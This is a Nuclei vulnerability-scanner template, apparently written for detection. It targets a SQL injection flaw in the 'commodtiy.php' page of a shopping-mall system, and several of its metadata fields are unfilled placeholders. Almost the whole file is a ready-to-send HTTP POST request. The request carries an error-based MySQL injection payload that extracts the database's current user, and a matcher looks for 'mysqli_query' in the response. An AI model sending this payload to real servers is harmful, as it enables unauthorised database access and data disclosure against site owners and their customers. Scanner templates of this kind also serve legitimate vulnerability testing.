id: gwsc-commodtiy-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 购物商城系统commodtiy存在任意SQL注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |
        POST /public/commodtiy.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Connection: close
        Content-Length: 217

        ddxq='||(SELECT+0x4776756d+WHERE+3443%3d3443+AND+(SELECT+9303+FROM(SELECT+COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER()+AS+NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a))||'
    matchers:
      - type: word
        part: body
        words:
          - 'mysqli_query'
